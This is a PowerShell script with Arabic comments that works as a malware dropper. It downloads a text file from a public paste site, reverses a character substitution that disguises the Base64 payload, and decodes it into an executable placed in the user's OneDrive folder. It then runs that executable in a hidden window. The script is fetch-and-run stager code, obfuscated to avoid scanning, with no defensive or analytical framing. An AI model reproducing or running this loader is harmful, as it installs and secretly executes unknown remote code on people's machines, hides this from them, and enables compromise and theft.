# تحديد الرابط الذي يحتوي على السلسلة النصية المشفرة
$url = "https://dpaste.com/EE63B5B9B.txt"

# تحديد المسار لحفظ السلسلة المشفرة المحملة في OneDrive
$oneDriveFolder = "C:\Users\$env:USERNAME\OneDrive\MyApp"
$outputFile = "$oneDriveFolder\base64_data.txt"
$outputExe = "$oneDriveFolder\script.exe"

# التأكد من وجود المجلد في OneDrive، إذا لم يكن موجودًا سيتم إنشاؤه
if (-not (Test-Path $oneDriveFolder)) {
    New-Item -ItemType Directory -Path $oneDriveFolder
}

# تحميل السلسلة النصية من الرابط إلى الملف
Invoke-WebRequest -Uri $url -OutFile $outputFile

# التحقق من أن السلسلة تم تحميلها بنجاح
if (Test-Path $outputFile) {
    Write-Host "Base64 string downloaded successfully."
} else {
    Write-Host "Error downloading Base64 string."
    exit
}

# قراءة السلسلة النصية
$base64String = Get-Content -Path $outputFile -Raw

# استرجاع الحروف الأصلية قبل فك التشفير (استبدال & بـ A و * بـ B)
$base64String = $base64String -replace '&', 'A' -replace '\*', 'B'

# التحقق من السلسلة بعد الاستبدال
Write-Host "Modified Base64 string:"
Write-Host $base64String

# تحويل السلسلة إلى بايتات
try {
    $bytes = [Convert]::FromBase64String($base64String)
} catch {
    Write-Host "Error converting Base64 string to bytes: $_"
    exit
}

# كتابة البيانات إلى الملف EXE
[System.IO.File]::WriteAllBytes($outputExe, $bytes)

# تحقق مما إذا تم إنشاء EXE بنجاح
if (Test-Path $outputExe) {
    Write-Host "EXE file created successfully at: $outputExe"
    
    # إضافة تأخير بسيط قبل محاولة تشغيل EXE
    Start-Sleep -Seconds 2

    # تشغيل EXE في الخلفية باستخدام Start-Process
    Start-Process -FilePath $outputExe -WindowStyle Hidden

    Write-Host "EXE is now running in the background."
} else {
    Write-Host "Failed to create EXE."
}
